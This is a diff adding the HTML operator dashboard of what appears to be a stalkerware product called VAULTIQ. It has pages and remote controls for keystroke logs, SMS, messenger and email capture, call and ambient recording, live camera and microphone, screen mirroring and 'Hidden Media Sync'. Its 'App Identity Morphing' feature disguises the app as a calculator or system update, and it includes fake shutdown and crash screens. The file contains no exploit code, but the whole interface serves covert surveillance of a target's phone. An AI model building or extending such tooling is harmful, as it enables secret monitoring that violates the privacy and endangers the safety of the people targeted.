@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="app-title">VAULTIQ</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin="">
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="config.js"></script>
+</head>
+<body>
+    <!-- Login Overlay -->
+    <div id="login-overlay" class="login-overlay">
+        <div class="login-card">
+            <div class="login-header">
+                <div class="logo-wrapper">
+                    <span class="logo-icon">🔐</span>
+                </div>
+                <h1 id="login-title">Welcome to VAULTIQ</h1>
+                <p class="login-subtitle">Sign in to continue to your dashboard</p>
+            </div>
+
+            <form id="login-form" class="login-form">
+                <div class="form-group">
+                    <label for="login-email" class="form-label">Email Address</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">📧</span>
+                        <input 
+                            type="email" 
+                            id="login-email" 
+                            class="form-input"
+                            required 
+                            placeholder="you@example.com"
+                            autocomplete="email"
+                            aria-label="Email address"
+                        >
+                        <span class="input-validation-icon" id="email-validation-icon"></span>
+                    </div>
+                    <p class="form-error" id="email-error"></p>
+                </div>
+
+                <div class="form-group">
+                    <label for="login-password" class="form-label">Password</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">🔒</span>
+                        <input 
+                            type="password" 
+                            id="login-password" 
+                            class="form-input"
+                            required 
+                            placeholder="••••••••"
+                            autocomplete="current-password"
+                            aria-label="Password"
+                        >
+                        <button type="button" id="password-toggle-btn" class="password-toggle-btn" aria-label="Toggle password visibility">
+                            <span id="password-toggle-icon">👁️</span>
+                        </button>
+                    </div>
+                    <p class="form-error" id="password-error"></p>
+                </div>
+
+                <div class="form-group form-row">
+                    <label class="checkbox-label">
+                        <input type="checkbox" id="remember-me" class="form-checkbox" aria-label="Remember me">
+                        <span class="checkmark"></span>
+                        Remember Me
+                    </label>
+                    <a href="#" class="forgot-password-link" id="forgot-password-link">Forgot Password?</a>
+                </div>
+
+                <button type="submit" id="login-submit-btn" class="login-btn" aria-live="polite">
+                    <span id="login-btn-text">Sign In</span>
+                    <span id="login-btn-spinner" class="btn-spinner" style="display: none;"></span>
+                </button>
+            </form>
+
+            <div class="login-footer">
+                <p class="signup-text">Don't have an account? 
+                    <a href="#" id="signup-link" class="signup-link">Create New Account</a>
+                </p>
+                <p class="contact-text" style="color: var(--color-error); margin-top: 16px;">PSS VHULE GESE EI ID TE MSG KORO TELE GRAM ID- @zexc9</p>
+            </div>
+
+            <div id="login-error" class="login-error-alert" role="alert" aria-live="assertive" style="display: none;"></div>
+        </div>
+    </div>
+
+    <div class="container" id="main-dashboard" style="display: none;">
+        <!-- Mobile Menu Toggle Button -->
+        <button id="mobile-menu-toggle" class="mobile-menu-toggle" aria-label="Toggle navigation menu" aria-expanded="false">
+            <span class="hamburger-icon"></span>
+            <span class="hamburger-icon"></span>
+            <span class="hamburger-icon"></span>
+        </button>
+
+        <aside class="sidebar" role="navigation" aria-label="Main navigation" id="sidebar">
+            <div class="sidebar-header">
+                <h2 id="sidebar-title">🔍 VAULTIQ</h2>
+            </div>
+            <nav class="sidebar-nav">
+                <button class="nav-item active" data-page="dashboard" aria-current="page">Dashboard</button>
+                <button class="nav-item" data-page="timeline">Timeline</button>
+                <button class="nav-item" data-page="map">Location</button>
+                <button class="nav-item" data-page="keyword-alerts">Keyword Alerts</button>
+                <button class="nav-item" data-page="calls">Call Logs</button>
+                <button class="nav-item" data-page="sms">SMS Messages</button>
+                <button class="nav-item" data-page="messengers">Messengers</button>
+                <button class="nav-item" data-page="web">Web History</button>
+                <button class="nav-item" data-page="apps">App Usage</button>
+                <button class="nav-item" data-page="photos">Photos</button>
+                <button class="nav-item" data-page="screenshots">Screenshots</button>
+                <button class="nav-item" data-page="keystrokes">Keystrokes</button>
+                <button class="nav-item" data-page="clipboard">Clipboard</button>
+                <button class="nav-item" data-page="contacts">Contacts</button>
+                <button class="nav-item" data-page="calendar">Calendar</button>
+                <button class="nav-item" data-page="wifi">Wi-Fi History</button>
+                <button class="nav-item" data-page="installed-apps">Installed Apps</button>
+                <button class="nav-item" data-page="call-recordings">Call Recordings</button>
+        <button class="nav-item" data-page="emails">Emails</button>
+        <button class="nav-item" data-page="ambient">Ambient Recordings</button>
+                <button class="nav-item" data-page="screen-record">Screen Recordings</button>
+                <button class="nav-item" data-page="risks">Risk Alerts</button>
+                <button class="nav-item" data-page="device">Device Info</button>
+                <button class="nav-item" data-page="network">Network Info</button>
+                <button class="nav-item" data-page="sim">SIM Changes</button>
+                <button class="nav-item" data-page="app-traffic">App Traffic</button>
+                <button class="nav-item" data-page="app-context">App Screen Context</button>
+            </nav>
+        </aside>
+        <main class="main-content" role="main">
+            <header class="header">
+                <div style="display: flex; flex-direction: column; gap: 4px;">
+                    <h1 id="page-title">Dashboard</h1>
+                    <div class="device-selector-container">
+                        <div id="device-grid" class="device-grid">
+                            <!-- Device thumbnails will be injected here -->
+                        </div>
+                        <select id="device-selector" aria-label="Select target device" style="display: none;">
+                            <option value="">Loading devices...</option>
+                        </select>
+                        <span id="device-status-badge" style="margin-left: 8px; font-size: 12px; padding: 4px 8px; border-radius: 12px;"></span>
+                    </div>
+                </div>
+                <div class="header-actions">
+                    <button id="lang-toggle" aria-label="Switch Language" style="padding: 8px 12px; border-radius: 6px; border: none; background: var(--color-primary); color: white; cursor: pointer; font-size: 14px;">🌐 EN</button>
+                    <button id="refresh-btn" aria-label="Refresh data">🔄 Refresh</button>
+                    <button id="export-csv-btn" aria-label="Export data as CSV">📊 Export CSV</button>
+                    <button id="export-json-btn" aria-label="Export data as JSON">📋 Export JSON</button>
+                    <button id="logout-btn" aria-label="Logout" style="background-color: var(--color-danger);">🚪 Logout</button>
+                </div>
+            </header>
+
+            <div class="filter-bar" aria-label="Filter and search options">
+                <div class="filter-group">
+                    <label for="platform-filter">Platform:</label>
+                    <select id="platform-filter" aria-label="Filter by platform">
+                        <option value="all">All Platforms</option>
+                    </select>
+                </div>
+                <div class="filter-group">
+                    <label for="start-date">From:</label>
+                    <input type="datetime-local" id="start-date" aria-label="Start date filter">
+                </div>
+                <div class="filter-group">
+                    <label for="end-date">To:</label>
+                    <input type="datetime-local" id="end-date" aria-label="End date filter">
+                </div>
+                <div class="filter-group search-group">
+                    <label for="search-input">Search:</label>
+                    <input type="text" id="search-input" placeholder="Search..." aria-label="Search input">
+                </div>
+            </div>
+
+            <div id="alerts-container" class="alerts-container" role="alert" aria-live="polite"></div>
+
+            <!-- Global Timeline Page -->
+            <section id="timeline-page" class="page" aria-labelledby="page-title">
+                <div class="timeline-container" id="behavior-timeline">
+                    <!-- Events will be dynamically injected here -->
+                </div>
+            </section>
+
+            <!-- Keyword Alerts Page -->
+            <section id="keyword-alerts-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Keyword</th>
+                                <th>App</th>
+                                <th>Full Content</th>
+                                <th>Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="keyword-alerts-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Dashboard Page -->
+            <section id="dashboard-page" class="page active" aria-labelledby="page-title">
+                <div class="remote-commands">
+                    <h3>Remote Commands</h3>
+                    <div class="command-buttons">
+                        <button class="command-btn" id="cmd-fetch-location" aria-label="Fetch device location">📍 Fetch Location</button>
+                        <button class="command-btn" id="cmd-take-photo" aria-label="Take remote photo">📷 Take Photo</button>
+                        <button class="command-btn" id="cmd-take-screenshot" aria-label="Take screenshot">📸 Take Screenshot</button>
+                        <button class="command-btn" id="cmd-sync-data" aria-label="Sync device data">🔄 Sync Data</button>
+                        <button class="command-btn" id="cmd-deep-scan" aria-label="Deep scan" style="background-color: var(--color-primary);">🛡️ NASA Deep Scan</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">📹 Call Recording Controls</h4>
+                    <div class="timer-display" id="call-recording-timer" style="font-size: 32px; font-weight: bold; margin: 16px 0; color: var(--color-primary);">00:00:00</div>
+                    <div class="command-buttons">
+                        <button class="command-btn" id="cmd-start-call-recording" aria-label="Start call recording" style="background-color: var(--color-success);">▶️ Start Recording</button>
+                        <button class="command-btn" id="cmd-pause-call-recording" aria-label="Pause call recording" style="background-color: var(--color-warning);">⏸️ Pause Recording</button>
+                        <button class="command-btn" id="cmd-stop-call-recording" aria-label="Stop call recording" style="background-color: var(--color-danger);">⏹️ Stop Recording</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">🖥️ Screen Recording Controls</h4>
+                    <div class="command-buttons">
+                        <button class="command-btn" id="cmd-start-screen-record" aria-label="Start screen recording" style="background-color: var(--color-success);">⏺️ Start Screen Record</button>
+                        <button class="command-btn" id="cmd-stop-screen-record" aria-label="Stop screen recording" style="background-color: var(--color-danger);">⏹️ Stop Screen Record</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">🛡️ Device Security (Lock/Wipe)</h4>
+                    <div class="command-buttons">
+                        <button class="command-btn" id="cmd-lock-device" aria-label="Lock device" style="background-color: var(--color-warning);">🔒 Lock Device</button>
+                        <button class="command-btn" id="cmd-wipe-device" aria-label="Wipe device data" style="background-color: var(--color-danger);">⚠️ Wipe Data</button>
+                        <button class="command-btn" id="cmd-fake-crash" aria-label="Show fake crash" style="background-color: #64748b;">💥 Fake Crash</button>
+                        <button class="command-btn" id="cmd-clear-crash" aria-label="Clear fake crash" style="background-color: #94a3b8;">✨ Clear Crash</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">🔌 Fake Power Controls</h4>
+                    <div class="command-buttons">
+                        <button class="command-btn" id="cmd-fake-reboot" aria-label="Show fake reboot" style="background-color: #475569;">🔄 Fake Reboot</button>
+                        <button class="command-btn" id="cmd-fake-shutdown" aria-label="Show fake shutdown" style="background-color: #334155;">🔌 Fake Shutdown</button>
+                        <button class="command-btn" id="cmd-clear-fake-poweroff" aria-label="Clear fake power off" style="background-color: #94a3b8;">✅ Clear</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">📋 Clipboard Manager</h4>
+                    <div class="command-buttons">
+                        <input type="text" id="inject-clipboard-text" placeholder="Text to inject to clipboard" style="flex: 1; padding: 12px; border-radius: 8px; border: 1px solid #ddd;">
+                        <button class="command-btn" id="cmd-inject-clipboard" aria-label="Inject clipboard text" style="background-color: var(--color-primary);">📋 Inject</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">🎙️ Live Audio Listening</h4>
+                    <div class="command-buttons">
+                        <button class="command-btn" id="cmd-start-live-listen" aria-label="Start live listening" style="background-color: var(--color-success);">🎤 Start Live Listen</button>
+                        <button class="command-btn" id="cmd-stop-live-listen" aria-label="Stop live listening" style="background-color: var(--color-danger);">🔇 Stop Live Listen</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">📹 Burst Live Camera</h4>
+                    <div class="command-buttons">
+                        <button class="command-btn" id="cmd-live-camera-front" aria-label="Start live front camera" style="background-color: var(--color-success);">📷 Front Camera</button>
+                        <button class="command-btn" id="cmd-live-camera-back" aria-label="Start live back camera" style="background-color: var(--color-success);">📸 Back Camera</button>
+                        <button class="command-btn" id="cmd-live-camera-stop" aria-label="Stop live camera" style="background-color: var(--color-danger);">🚫 Stop Camera</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">📺 Live Screen Mirror</h4>
+                    <div class="command-buttons">
+                        <button class="command-btn" id="cmd-start-mirror" aria-label="Start mirroring" style="background-color: var(--color-success);">📺 Start Mirror</button>
+                        <button class="command-btn" id="cmd-stop-mirror" aria-label="Stop mirroring" style="background-color: var(--color-danger);">🚫 Stop Mirror</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">📢 Voice Broadcast</h4>
+                    <div class="command-buttons">
+                        <input type="text" id="broadcast-url" placeholder="Audio URL (mp3/wav)" style="flex: 1; padding: 12px; border-radius: 8px; border: 1px solid #ddd;">
+                        <button class="command-btn" id="cmd-broadcast" aria-label="Broadcast voice">📢 Play</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">⚙️ Auto-Feature Settings</h4>
+                    <div class="command-buttons" style="background: #f8fafc; padding: 16px; border-radius: 12px; border: 1px solid #e2e8f0; display: block;">
+                        <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
+                            <label class="switch">
+                                <input type="checkbox" id="toggle-auto-call-record">
+                                <span class="slider round"></span>
+                            </label>
+                            <span>Auto Call Record</span>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
+                            <label class="switch">
+                                <input type="checkbox" id="toggle-unlock-selfie">
+                                <span class="slider round"></span>
+                            </label>
+                            <span>Intruder Selfie on Unlock</span>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
+                            <label class="switch">
+                                <input type="checkbox" id="toggle-voip-record">
+                                <span class="slider round"></span>
+                            </label>
+                            <span>VoIP Call Recording</span>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
+                            <label class="switch">
+                                <input type="checkbox" id="toggle-media-sync">
+                                <span class="slider round"></span>
+                            </label>
+                            <span>Hidden Media Sync (Gallery/Social)</span>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
+                            <label class="switch">
+                                <input type="checkbox" id="toggle-wifi-only">
+                                <span class="slider round"></span>
+                            </label>
+                            <span>WiFi Only Sync</span>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
+                            <label class="switch">
+                                <input type="checkbox" id="toggle-block-incognito">
+                                <span class="slider round"></span>
+                            </label>
+                            <span>Block Incognito Mode</span>
+                        </div>
+                        <div style="margin-bottom: 12px; padding-left: 44px; display: flex; gap: 10px;">
+                            <input type="text" id="incognito-apps-input" placeholder="com.android.chrome, org.mozilla.firefox" style="padding: 8px; border: 1px solid #ddd; border-radius: 6px; flex: 1;">
+                            <button class="command-btn" id="btn-update-incognito-apps" style="padding: 8px 16px; background: #64748b;">Update Apps</button>
+                        </div>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">🎯 Keyword Triggered Screenshots</h4>
+                    <div class="command-buttons" style="background: #f0f9ff; padding: 16px; border-radius: 12px; border: 1px solid #bae6fd;">
+                        <input type="text" id="keyword-input" placeholder="Enter keywords (comma separated)..." style="flex: 1; padding: 12px; border-radius: 8px; border: 1px solid #7dd3fc;">
+                        <button class="command-btn" id="btn-update-keywords" style="background-color: #0284c7;">💾 Save Keywords</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">🎭 App Identity Morphing</h4>
+                    <div class="command-buttons" style="background: #fff7ed; padding: 16px; border-radius: 12px; border: 1px solid #fed7aa;">
+                        <select id="icon-selector" style="flex: 1; padding: 12px; border-radius: 8px; border: 1px solid #fdba74;">
+                            <option value="default">Default (System Update)</option>
+                            <option value="calculator">Calculator</option>
+                            <option value="calendar">Calendar</option>
+                            <option value="weather">Weather</option>
+                        </select>
+                        <button class="command-btn" id="btn-morph-app" style="background-color: #ea580c;">✨ Morph Identity</button>
+                    </div>
+                </div>
+                <div class="stats-grid" aria-label="Dashboard statistics">
+                    <div class="stat-card">
+                        <h3>📍 Total Locations</h3>
+                        <p class="stat-value" id="stat-locations">0</p>
+                    </div>
+                    <div class="stat-card">
+                        <h3>📞 Total Calls</h3>
+                        <p class="stat-value" id="stat-calls">0</p>
+                    </div>
+                    <div class="stat-card">
+                        <h3>💬 Total SMS</h3>
+                        <p class="stat-value" id="stat-sms">0</p>
+                    </div>
+                    <div class="stat-card">
+                        <h3>🔋 Battery Level</h3>
+                        <p class="stat-value" id="stat-battery">-</p>
+                    </div>
+                </div>
+                <div class="charts-grid" style="margin-top: 24px;">
+                    <div class="chart-container">
+                        <h3>Top Apps</h3>
+                        <canvas id="apps-chart" aria-label="Top apps usage chart" role="img"></canvas>
+                    </div>
+                </div>
+                <div class="devices-list">
+                    <h2>Recent Activity</h2>
+                    <div id="recent-activity" aria-live="polite"></div>
+                </div>
+            </section>
+
+            <!-- Map Page -->
+            <section id="map-page" class="page" aria-labelledby="page-title">
+                <div class="geofence-section">
+                    <h3>Geofencing</h3>
+                    <div class="geofence-controls">
+                        <input type="text" id="geofence-name" placeholder="Geofence name" aria-label="Geofence name input">
+                        <input type="number" id="geofence-radius" placeholder="Radius (meters)" value="100" aria-label="Geofence radius input">
+                        <button class="command-btn" id="btn-add-geofence" aria-label="Add new geofence">➕ Add Geofence</button>
+                    </div>
+                    <div id="geofences-list" class="geofences-list" aria-live="polite"></div>
+                </div>
+                <div id="map" class="map-container" role="application" aria-label="Device location map"></div>
+            </section>
+
+            <!-- Calls Page -->
+            <section id="calls-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Call logs table">
+                        <thead>
+                            <tr>
+                                <th scope="col">Contact</th>
+                                <th scope="col">Number</th>
+                                <th scope="col">Type</th>
+                                <th scope="col">Duration</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="calls-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- SMS Page -->
+            <section id="sms-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="SMS messages table">
+                        <thead>
+                            <tr>
+                                <th scope="col">Contact</th>
+                                <th scope="col">Number</th>
+                                <th scope="col">Type</th>
+                                <th scope="col">Message</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="sms-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Messengers Page -->
+            <section id="messengers-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Messenger messages table">
+                        <thead>
+                            <tr>
+                                <th scope="col">App</th>
+                                <th scope="col">Contact</th>
+                                <th scope="col">Type</th>
+                                <th scope="col">Message</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="messengers-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Web History Page -->
+            <section id="web-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Web browsing history table">
+                        <thead>
+                            <tr>
+                                <th scope="col">Title</th>
+                                <th scope="col">URL</th>
+                                <th scope="col">Entry Time</th>
+                                <th scope="col">Exit Time</th>
+                                <th scope="col">Duration</th>
+                                <th scope="col">Browsing Mode</th>
+                                <th scope="col">Recorded At</th>
+                            </tr>
+                        </thead>
+                        <tbody id="web-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Apps Page -->
+            <section id="apps-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="App usage history table">
+                        <thead>
+                            <tr>
+                                <th scope="col">App</th>
+                                <th scope="col">Package</th>
+                                <th scope="col">Usage Time</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="apps-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Photos Page -->
+            <section id="photos-page" class="page" aria-labelledby="page-title">
+                <div class="grid-container" id="photos-grid" aria-label="Device photos gallery"></div>
+            </section>
+
+            <!-- Screenshots Page -->
+            <section id="screenshots-page" class="page" aria-labelledby="page-title">
+                <div class="grid-container" id="screenshots-grid" aria-label="Device screenshots gallery"></div>
+            </section>
+
+            <!-- Keystrokes Page -->
+            <section id="keystrokes-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Keystroke logs table">
+                        <thead>
+                            <tr>
+                                <th scope="col">App</th>
+                                <th scope="col">Text</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="keystrokes-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Clipboard Page -->
+            <section id="clipboard-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Clipboard history table">
+                        <thead>
+                            <tr>
+                                <th scope="col">Content</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="clipboard-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Contacts Page -->
+            <section id="contacts-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Contacts history table">
+                        <thead>
+                            <tr>
+                                <th scope="col">Name</th>
+                                <th scope="col">Phone Numbers</th>
+                                <th scope="col">Emails</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="contacts-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Calendar Page -->
+            <section id="calendar-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Event</th>
+                                <th>Location</th>
+                                <th>Start Time</th>
+                                <th>End Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="calendar-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Wi-Fi Page -->
+            <section id="wifi-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>SSID</th>
+                                <th>BSSID</th>
+                                <th>Last Seen</th>
+                            </tr>
+                        </thead>
+                        <tbody id="wifi-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Installed Apps Page -->
+            <section id="installed-apps-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>App Name</th>
+                                <th>Package Name</th>
+                                <th>Version</th>
+                                <th>Action</th>
+                            </tr>
+                        </thead>
+                        <tbody id="installed-apps-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Call Recordings Page -->
+            <section id="call-recordings-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Call recordings table">
+                        <thead>
+                            <tr>
+                                <th scope="col">Contact</th>
+                                <th scope="col">Phone Number</th>
+                                <th scope="col">Call Type</th>
+                                <th scope="col">Duration</th>
+                                <th scope="col">File</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="call-recordings-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Emails Page -->
+            <section id="emails-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Emails table">
+                        <thead>
+                            <tr>
+                                <th scope="col">From</th>
+                                <th scope="col">To</th>
+                                <th scope="col">Subject</th>
+                                <th scope="col">Body</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="emails-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Ambient Recordings Page -->
+            <section id="ambient-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Ambient recordings history table">
+                        <thead>
+                            <tr>
+                                <th scope="col">File</th>
+                                <th scope="col">Duration</th>
+                                <th scope="col">Recorded At</th>
+                            </tr>
+                        </thead>
+                        <tbody id="ambient-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Screen Recordings Page -->
+            <section id="screen-record-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Screen recordings history table">
+                        <thead>
+                            <tr>
+                                <th scope="col">File</th>
+                                <th scope="col">Duration</th>
+                                <th scope="col">Recorded At</th>
+                            </tr>
+                        </thead>
+                        <tbody id="screen-record-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Risk Alerts Page -->
+            <section id="risks-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Risk alerts table">
+                        <thead>
+                            <tr>
+                                <th scope="col">Alert Type</th>
+                                <th scope="col">Description</th>
+                                <th scope="col">Source</th>
+                                <th scope="col">Content</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="risks-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Device Info Page -->
+            <section id="device-page" class="page" aria-labelledby="page-title">
+                <div class="device-info-container">
+                    <div class="info-card" id="device-info-card" aria-label="Device information"></div>
+                </div>
+            </section>
+
+            <!-- Network Info Page -->
+            <section id="network-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Network information history table">
+                        <thead>
+                            <tr>
+                                <th scope="col">Wi-Fi SSID</th>
+                                <th scope="col">Network Type</th>
+                                <th scope="col">Signal Strength</th>
+                                <th scope="col">Cell Info (CID/LAC)</th>
+                                <th scope="col">Carrier (MCC/MNC)</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="network-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- SIM Changes Page -->
+            <section id="sim-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="SIM change history table">
+                        <thead>
+                            <tr>
+                                <th scope="col">Old IMSI</th>
+                                <th scope="col">New IMSI</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="sim-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- App Screen Context Page -->
+            <section id="app-context-page" class="page" aria-labelledby="page-title">
+                <div class="timeline-container" id="app-context-timeline">
+                    <!-- Timeline items will be injected here -->
+                </div>
+            </section>
+
+            <!-- App Traffic Page -->
+            <section id="app-traffic-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>App Name</th>
+                                <th>Package</th>
+                                <th>Bytes Sent</th>
+                                <th>Bytes Received</th>
+                                <th>Total Traffic</th>
+                                <th>Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="app-traffic-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+        </main>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
